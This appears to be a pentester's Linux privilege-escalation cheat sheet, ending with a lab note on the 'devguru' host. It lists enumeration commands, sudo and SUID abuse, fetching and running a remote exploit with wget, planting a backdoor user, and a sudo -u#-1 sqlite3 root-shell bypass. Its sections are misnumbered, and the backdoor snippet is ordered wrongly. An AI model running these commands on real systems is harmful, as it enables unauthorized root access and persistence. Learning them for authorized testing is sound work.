
# Linux Privilege Escalation Guide

## 1. Enumeration (Know Your Environment)

- **Basic Info Gathering**:
  ```bash
  hostnamectl              # System hostname and details  
  hostname                    # Discover hostname
  cat /etc/issue             # OS release and version
  cat /etc/os-release        # OS details
  uname -a                   # Kernel version and architecture
  cat /proc/version          # Detailed kernel information
  whoami                   # Current user  
  id                       # User ID and groups  
  ```

- **Network Configuration**:
  ```bash
  ip a                     # Network interfaces  
  ip route                 # Display routing table
  netstat -tuln            # Listening ports  
  ss -tunapl                 # Active connections and listening ports
  ```

- **Firewall Rules**:
  ```bash
  cat /etc/iptables/rules.v4 # Check IPv4 firewall rules
  cat /etc/network/interfaces # Network interface configuration
  ```

- **Processes & Scheduled Tasks**:
  ```bash
  ps aux                   # Running processes  
  ls -lah /etc/cron*          # List cron jobs
  crontab -l                  # List user cron jobs
  cat /var/log/cron.log       # Inspect cron logs
  grep "CRON" /var/log/syslog  # Inspect cron logs
  ```

- **Capturing Traffic**:
  ```bash
  sudo tcpdump -i lo -A | grep "pass"  # Capture loopback traffic
  sudo tcpdump -nvvvXi tun0 tcp port 8080
  ```
- **Check for Running Services**:
  ```bash
  systemctl list-units --type=service --state=running  
  ```

---

## 2. Weak File Permissions

- **Search for Writable Files**:
  ```bash
  find / -type f -perm -o+w 2>/dev/null  
  ```
- **Writable Directories**:
  ```bash
  find / -type d -perm -o+w 2>/dev/null  
  ```
- **Check SUID Binaries GUID and Capabilities**:
  ```bash
  find / -perm -4000 -type f 2>/dev/null  
  find / -perm -g=s -type f 2>/dev/null  
  /usr/sbin/getcap -r / 2>/dev/null     # Enumerate capabilities
  ```

## 5. Inspecting System Configuration

- **File Systems and Mounts**:
  ```bash
  cat /etc/fstab             # Mounted drives at boot
  mount                      # List mounted filesystems
  lsblk                      # View available disks and partitions
  ```

- **Kernel Modules**:
  ```bash
  lsmod                      # List loaded kernel modules
  /sbin/modinfo <module>     # Detailed info about a specific module
  ```
---

## 3. Misconfigurations in SUDO

- **View SUDO Permissions**:
  ```bash
  sudo -l  
  ```

- **Exploitable SUDO Misconfigurations**:
  - If a binary like `vi`, `nano`, or `python` is allowed:
    ```bash
    sudo vi /etc/shadow    # Edit files as root  
    ```

  - If SUDO allows execution of a script or command:
    ```bash
    sudo command /path/to/script  
    ```

---

## 4. Exploitable Binaries

- **GTFOBins** (Good for SUID, Cron, or SUDO abuse):
  Visit [GTFOBins](https://gtfobins.github.io) to find escape techniques for binaries.

---

## 5. Kernel Exploits

- Identify vulnerable kernel versions using:
  ```bash
  uname -r  
  ```

- Look for exploit scripts at:
  - [Exploit Database](https://www.exploit-db.com)  
  - [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)  

---

## 6. Exploiting User Credentials

- **Search for Sensitive Files**:
  ```bash
  grep -Ri "password" /home/  
  ```

- **View User History**:
  ```bash
  cat ~/.bash_history  
  ```

---

## 7. Cron Jobs Abuse

- **Find Writable Cron Jobs**:
  ```bash
  ls -la /etc/cron*  
  ```

- If a script is run by a cron job and is writable:
  - Inject malicious code into the script to gain privileges.

---

## 8. Pivoting to Root

- **Use Exploit Scripts**:
  ```bash
  wget http://example.com/exploit.c -O exploit.c  
  gcc exploit.c -o exploit  
  ./exploit  
  ```

- **Abuse Misconfigured Binaries** using **GTFOBins** strategies.

---

## 9. Post-Exploitation Tips

- **Gain a Root Shell**:
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'  
  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
  ```

- **Persist as Root** (Add a backdoor):
  ```bash
  echo "newuser:password" | chpasswd  
  useradd newuser -s /bin/bash -m  
  ```

---

## 10. Tools for Automation

- **LinPEAS** (Privilege Escalation Script):
  ```bash
  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh  
  chmod +x linpeas.sh  
  ./linpeas.sh  
  ```

- **Linux Exploit Suggester**:
  ```bash
  perl linux-exploit-suggester.pl  
  ```





  ## Sudo

  User frank may run the following commands on devguru:
      (ALL, !root) NOPASSWD: /usr/bin/sqlite3


  sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
